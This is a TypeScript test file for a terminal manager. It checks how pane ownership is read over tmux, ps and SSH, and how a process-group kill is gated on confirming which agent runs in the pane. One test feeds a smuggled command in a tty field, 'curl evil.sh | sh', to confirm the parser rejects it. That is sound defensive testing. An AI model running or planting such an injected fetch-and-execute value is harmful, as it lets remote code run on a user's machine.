// `PtyManager.paneOwner` — the two round-trips, on both legs, and every way they can fail.
//
// The pure parsers are proven against a real tmux pane in `agents/pane-owner.test.ts`. What is left
// for this file is DISPATCH: which binary is asked, with which argv, on a local session versus an
// SSH-project one — and the failure contract, which is the security-relevant half. A partial
// `PaneOwner` (identity, no argv) would read to the predicate as "the kernel answered", so every
// failure here must answer null.
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform } from './platform-fake'
import { TMUX_SOCKET, sessionName } from './tmux-naming'
import { PANE_OWNER_FMT } from './agents/pane-owner'
import { RMT_TMUX_SOCKET } from './remote-ssh/control-master'
import type { AgentProcessProof, TerminateForegroundOutcome } from '../shared/types'

/** Every `runAsync` in pty-manager lands here. `answer` decides what each call resolves to. */
const calls: Array<{ file: string; args: string[] }> = []
const script = vi.hoisted(() => ({
  answer: (() => ({ stdout: '' })) as (file: string, args: string[]) => { stdout: string }
}))

vi.mock('child_process', () => {
  type Cb = (err: Error | null, res?: { stdout: string; stderr: string }) => void
  const execFile = (file: string, args: string[], a?: unknown, b?: unknown): unknown => {
    const cb = (typeof a === 'function' ? a : b) as Cb | undefined
    calls.push({ file, args })
    try {
      cb?.(null, { ...script.answer(file, args), stderr: '' })
    } catch (e) {
      cb?.(e as Error)
    }
    return {}
  }
  return { execFile, execFileSync: (): string => '' }
})

const ssh = vi.hoisted(() => ({ path: '/usr/bin/ssh' as string | null }))
vi.mock('./exec-path', async (importOriginal) => ({
  ...(await importOriginal<typeof import('./exec-path')>()),
  findExecutableSync: (bin: string) => (bin === 'ssh' ? ssh.path : null),
  shellPathNow: () => '/usr/bin:/bin',
  resolveShellPath: async () => '/usr/bin:/bin'
}))

vi.mock('node-pty', () => ({
  spawn: () => ({
    onData: () => {},
    onExit: () => {},
    write: () => {},
    resize: () => {},
    pause: () => {},
    resume: () => {},
    kill: () => {},
    pid: 4321
  })
}))

const NODE = 'node-1'
const TARGET = sessionName(NODE)
const TTY = '/dev/pts/7'
const PS_OUT = [
  '2485382 2485382 Ss   -bash',
  '2503294 2503294 Sl+  node /usr/local/bin/claude --resume x',
  '2503300 2503294 S+   rg --files'
].join('\n')

/**
 * A manager with one registered session and a resolved tmux, built WITHOUT going through `create`.
 * `paneOwner` reads exactly two things off a session — its `persistKey` and its `sshRemote` — so a
 * spawn harness would be noise around the thing under test.
 */
async function manager(opts: { tmux?: string | null; sshRemote?: unknown } = {}) {
  const { PtyManager } = await import('./pty-manager')
  const mgr = new PtyManager() as unknown as {
    tmuxPath: string | null
    sessions: Map<string, unknown>
    paneOwner(k: string): Promise<unknown>
  }
  mgr.tmuxPath = opts.tmux === undefined ? '/usr/bin/tmux' : opts.tmux
  mgr.sessions.set('sess-1', { persistKey: NODE, sshRemote: opts.sshRemote })
  return mgr
}

/**
 * The default healthy answers. Local: tmux answers the format, `ps` answers the tty listing.
 * SSH: the ONE combined exec answers the fenced identity line plus the `ps` rows in one stdout
 * (issue #460) — the reply shape `remotePaneOwnerCombinedArgs`'s script really produces, proven
 * against a real sh + tmux in `agents/pane-owner.test.ts`.
 */
function healthy(file: string, args: string[]): { stdout: string } {
  if (file === '/usr/bin/ssh') {
    return { stdout: `##NTPANE 2485382|${TTY}|node\n${PS_OUT}\n` }
  }
  if (args.includes(PANE_OWNER_FMT)) {
    return { stdout: `2485382|${TTY}|node\n` }
  }
  if (file === 'ps') return { stdout: PS_OUT }
  return { stdout: '' }
}

describe('PtyManager.paneOwner', () => {
  beforeEach(() => {
    calls.length = 0
    ssh.path = '/usr/bin/ssh'
    script.answer = healthy
    vi.resetModules()
    initPlatform(fakePlatform())
  })
  afterEach(() => {
    resetPlatformForTests()
  })

  it('local: one display-message on OUR socket, then one ps on the pane tty', async () => {
    const mgr = await manager()
    const owner = await mgr.paneOwner(NODE)

    expect(calls).toHaveLength(2)
    expect(calls[0]).toEqual({
      file: '/usr/bin/tmux',
      args: ['-L', TMUX_SOCKET, 'display-message', '-p', '-t', TARGET, PANE_OWNER_FMT]
    })
    expect(calls[1]).toEqual({
      file: 'ps',
      args: ['-ww', '-o', 'pid=', '-o', 'pgid=', '-o', 'stat=', '-o', 'args=', '-t', TTY]
    })
    expect(owner).toEqual({
      panePid: 2485382,
      tty: TTY,
      command: 'node',
      // The foreground group, and only it — the pane's own `-bash` is not in it.
      argv: ['node /usr/local/bin/claude --resume x', 'rg --files'],
      // …and the pid of each of those rows, in the same order. `ps` already prints the column; it
      // is what lets a delivery's post-write check tell "the same agent" from "an agent again".
      pids: [2503294, 2503300]
    })
  })

  it('SSH: ONE round-trip rides the project ControlMaster, and the local socket is never touched', async () => {
    // One exec, not two (issue #460): under a saturated/dead master every exec is a full ssh
    // LOGIN, and two of them did not fit the delivery gate's 2s probe budget — a live agent pane
    // then read as unknown, persistently.
    const mgr = await manager({
      sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
    })
    const owner = await mgr.paneOwner(NODE)

    expect(calls).toHaveLength(1)
    expect(calls[0].file).toBe('/usr/bin/ssh')
    expect(calls[0].args.includes('ControlPath=/tmp/cm-abc')).toBe(true)
    const script = calls[0].args.at(-1) as string
    // The REMOTE socket, never the local one — a local `nt-<id>` would be another machine's session.
    expect(script).toContain(`tmux -L ${RMT_TMUX_SOCKET} display-message`)
    expect(script).not.toContain(`-L ${TMUX_SOCKET} `)
    // Both halves of the read live in the one script: the fenced identity, then the ps rows.
    expect(script).toContain("printf '%s\\n'")
    expect(script).toContain('ps -ww -o pid= -o pgid= -o stat= -o args= -t "$tty"')
    expect(owner).toMatchObject({ tty: TTY, argv: [expect.stringContaining('claude'), 'rg --files'] })
  })

  it('SSH: a hostile tty in the reply is refused by the parser — never adopted as an owner', async () => {
    // The tty no longer crosses back into OUR command line at all (it is expanded quoted inside
    // the remote script), so the defense the old two-trip read applied at argv-build time now
    // lives in `parseCombinedPaneOwner`: an identity whose tty `isSafeTty` refuses answers null.
    script.answer = () => ({
      stdout: `##NTPANE 42|/dev/pts/0; curl evil.sh | sh|node\n${PS_OUT}\n`
    })
    const mgr = await manager({
      sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
    })

    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(1)
  })

  it('still asks the local socket for a node with no pty client — and null when tmux has no such session', async () => {
    // Deliberately the same reading as `paneCommand`: a tmux session OUTLIVES its pty client (that
    // is the whole point of the tmux backing), so "no session in the map" is not "no pane". What
    // makes this null is tmux answering "can't find session", not us guessing ahead of it.
    script.answer = () => {
      throw new Error("can't find session: nt-some-other-node")
    }
    const mgr = await manager()
    expect(await mgr.paneOwner('some-other-node')).toBeNull()
    expect(calls[0].args).toContain(sessionName('some-other-node'))
  })

  it('answers null — not a partial owner — when tmux is unavailable', async () => {
    const mgr = await manager({ tmux: null })
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(0)
  })

  it('answers null when ssh cannot be found for an SSH-project node', async () => {
    ssh.path = null
    const mgr = await manager({
      sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
    })
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(0)
  })

  it('answers null when the pane query throws (dead pane, wedged server)', async () => {
    script.answer = () => {
      throw new Error("can't find session: nt-node-1")
    }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
  })

  it('answers null on an empty pane read, and never asks ps about nothing', async () => {
    script.answer = () => ({ stdout: '' })
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(1)
  })

  it('answers null when ps returns nothing — a pane we cannot see is not a pane we can name', async () => {
    script.answer = (file, args) =>
      args.includes(PANE_OWNER_FMT) ? { stdout: `1|${TTY}|node` } : { stdout: '' }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
    expect(calls).toHaveLength(2)
  })

  it('answers null when ps lists the tty but marks no foreground group', async () => {
    script.answer = (file, args) =>
      args.includes(PANE_OWNER_FMT)
        ? { stdout: `1|${TTY}|node` }
        : { stdout: '2485382 2485382 Ss   -bash' }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
  })

  it('answers null when ps itself errors (a platform whose ps lacks these flags)', async () => {
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `1|${TTY}|node` }
      throw new Error('ps: illegal option -- w')
    }
    const mgr = await manager()
    expect(await mgr.paneOwner(NODE)).toBeNull()
  })
})

// ── terminateForeground identity gate (#226 review) ──────────────────────────────────────────────
// The kill must fire ONLY when the expected harness owns the foreground group. Refusing a shell is
// not enough: a stale model-switch menu could otherwise SIGTERM whatever the user is now running in
// the pane (vim, a build). These drive the real `terminateForeground` over the same fake exec.

/** Manager with getSettings wired (binariesFor needs customAgents) and a spy on process.kill. */
async function killManager(opts: { customAgents?: unknown[] } = {}) {
  const { PtyManager } = await import('./pty-manager')
  const mgr = new PtyManager() as unknown as {
    tmuxPath: string | null
    sessions: Map<string, unknown>
    getSettings: () => unknown
    terminateForeground(k: string, expected?: string): Promise<TerminateForegroundOutcome>
    agentProcess(k: string, expected: string): Promise<AgentProcessProof>
  }
  mgr.tmuxPath = '/usr/bin/tmux'
  mgr.sessions.set('sess-1', { persistKey: NODE, sshRemote: undefined })
  mgr.getSettings = () => ({ customAgents: opts.customAgents ?? [] })
  return mgr
}

describe('PtyManager.terminateForeground — identity gate', () => {
  let killed: number[]
  let killSpy: ReturnType<typeof vi.spyOn>
  beforeEach(() => {
    calls.length = 0
    ssh.path = '/usr/bin/ssh'
    vi.resetModules()
    initPlatform(fakePlatform())
    killed = []
    killSpy = vi.spyOn(process, 'kill').mockImplementation(((pid: number, sig?: string | number) => {
      // The grace poll probes with signal 0 and expects ESRCH once the group is gone; make the
      // first probe say "alive" then throw so the loop terminates fast.
      if (sig === 0) throw new Error('ESRCH')
      killed.push(pid)
      return true
    }) as typeof process.kill)
  })
  afterEach(() => {
    killSpy.mockRestore()
    resetPlatformForTests()
  })

  const claudeForeground = (file: string, args: string[]): { stdout: string } => {
    // paneOwner's PANE_OWNER_FMT read (MOST specific — it also contains '#{pane_pid}').
    if (args.includes(PANE_OWNER_FMT)) return { stdout: `2485382|${TTY}|node|%3\n` }
    // display-message #{pane_pid}|#{pane_current_command} (the kill path's pane read)
    if (args.join(' ').includes('#{pane_pid}')) return { stdout: '2485382|node' }
    // ps -o tpgid= -p <panePid>  (the kill-target read)
    if (args.includes('tpgid=')) return { stdout: '2503294' }
    // ps -ww ... -t tty  (paneOwner argv listing)
    if (file === 'ps') return { stdout: PS_OUT }
    return { stdout: '' }
  }

  it('KILLS the foreground group when the expected agent owns it', async () => {
    script.answer = claudeForeground
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('terminated')
    expect(killed).toEqual([-2503294]) // SIGTERM to the negative process group
  })

  it('reports already-exited when the original pane shell owns the foreground', async () => {
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `2485382|${TTY}|-zsh|%3\n` }
      if (file === 'ps') return { stdout: '2485382 2485382 Ss+  -zsh' }
      return { stdout: '' }
    }
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('already-exited')
    expect(killed).toEqual([])
  })

  it('forces respawn when a nested shell replaced the expected agent', async () => {
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `2485382|${TTY}|bash|%3\n` }
      if (file === 'ps') return { stdout: '2503294 2503294 S+   bash ./long-running-script.sh' }
      return { stdout: '' }
    }
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('already-exited')
    expect(killed).toEqual([])
  })

  it('REFUSES when the argv-verified agent PID exited before the kill boundary', async () => {
    script.answer = (file, args) => {
      // paneOwner identified PID 2503294 as Claude, but its liveness/tpgid re-check is now empty:
      // the agent exited and whatever owns the pane next must not inherit its kill authorization.
      if (args.includes('tpgid=') && args.at(-1) === '2503294') return { stdout: '' }
      return claudeForeground(file, args)
    }
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('refused')
    expect(killed).toEqual([])
  })

  it('recovers when the verified agent exits at the kill boundary and the login shell takes over', async () => {
    let ownerReads = 0
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) {
        ownerReads++
        return {
          stdout:
            ownerReads === 1
              ? `2485382|${TTY}|node|%3\n`
              : `2485382|${TTY}|-zsh|%3\n`
        }
      }
      if (args.includes('tpgid=')) {
        return { stdout: args.at(-1) === '2503294' ? '' : '2503294' }
      }
      if (file === 'ps') {
        return {
          stdout: ownerReads === 1 ? PS_OUT : '2485382 2485382 Ss+  -zsh'
        }
      }
      return { stdout: '' }
    }
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('already-exited')
    expect(killed).toEqual([])
  })

  it('forces respawn without signalling when a different program replaced the expected agent', async () => {
    // Foreground group is vim, not the agent.
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `2485382|${TTY}|vim|%3\n` }
      if (args.join(' ').includes('#{pane_pid}')) return { stdout: '2485382|vim' }
      if (args.includes('tpgid=')) return { stdout: '2503294' }
      if (file === 'ps')
        return { stdout: '2485382 2485382 Ss   -bash\n2503294 2503294 Sl+  vim /etc/hosts' }
      return { stdout: '' }
    }
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('already-exited')
    expect(killed).toEqual([])
  })

  it('REFUSES when the owner is unknown (paneOwner answers null) — fail closed on a kill', async () => {
    script.answer = (file, args) =>
      args.includes(PANE_OWNER_FMT) ? { stdout: `2485382|${TTY}|node\n` } : { stdout: '' } // ps empty ⇒ null owner
    const mgr = await killManager()
    expect(await mgr.terminateForeground(NODE, 'claude')).toBe('refused')
    expect(killed).toEqual([])
  })

  it('verifies a custom agent by its launchCmd binary instead of failing closed', async () => {
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `2485382|${TTY}|aider|%3\n` }
      if (args.join(' ').includes('#{pane_pid}')) return { stdout: '2485382|aider' }
      if (args.includes('tpgid=')) return { stdout: '2503294' }
      if (file === 'ps')
        return { stdout: '2485382 2485382 Ss   -bash\n2503294 2503294 Sl+  /usr/bin/aider --model gpt' }
      return { stdout: '' }
    }
    const mgr = await killManager({
      customAgents: [{ id: 'custom:x', label: 'Aider', launchCmd: 'aider' }]
    })
    expect(await mgr.terminateForeground(NODE, 'custom:x')).toBe('terminated')
    expect(killed).toEqual([-2503294])
  })

  it('proves the exact expected agent is running without signalling it', async () => {
    script.answer = claudeForeground
    const mgr = await killManager()

    expect(await mgr.agentProcess(NODE, 'claude')).toEqual({
      verdict: 'agent',
      shellPid: 2485382,
      agentPid: 2503294
    })
    expect(killed).toEqual([])
    expect(calls).toHaveLength(2)
  })

  it('reports a successful owner mismatch when the launched agent already exited', async () => {
    script.answer = (file, args) => {
      if (args.includes(PANE_OWNER_FMT)) return { stdout: `2485382|${TTY}|-zsh|%3\n` }
      if (file === 'ps') return { stdout: '2485382 2485382 Ss+  -zsh' }
      return { stdout: '' }
    }
    const mgr = await killManager()

    expect(await mgr.agentProcess(NODE, 'claude')).toEqual({
      verdict: 'not-agent',
      shellPid: 2485382,
      agentPid: undefined
    })
    expect(killed).toEqual([])
  })

  it('reports unknown when the post-launch owner cannot be read', async () => {
    script.answer = (file, args) =>
      args.includes(PANE_OWNER_FMT) ? { stdout: `2485382|${TTY}|node\n` } : { stdout: '' }
    const mgr = await killManager()

    expect(await mgr.agentProcess(NODE, 'claude')).toEqual({
      verdict: 'unknown',
      shellPid: undefined,
      agentPid: undefined
    })
    expect(killed).toEqual([])
  })

  it('with no expected id, keeps the legacy shell-only guard (kills a non-shell foreground)', async () => {
    script.answer = claudeForeground
    const mgr = await killManager()
    // No identity read happens (no PANE_OWNER_FMT call) — only the tpgid path.
    expect(await mgr.terminateForeground(NODE)).toBe('terminated')
    expect(killed).toEqual([-2503294])
    expect(calls.some((c) => c.args.includes(PANE_OWNER_FMT))).toBe(false)
  })
})
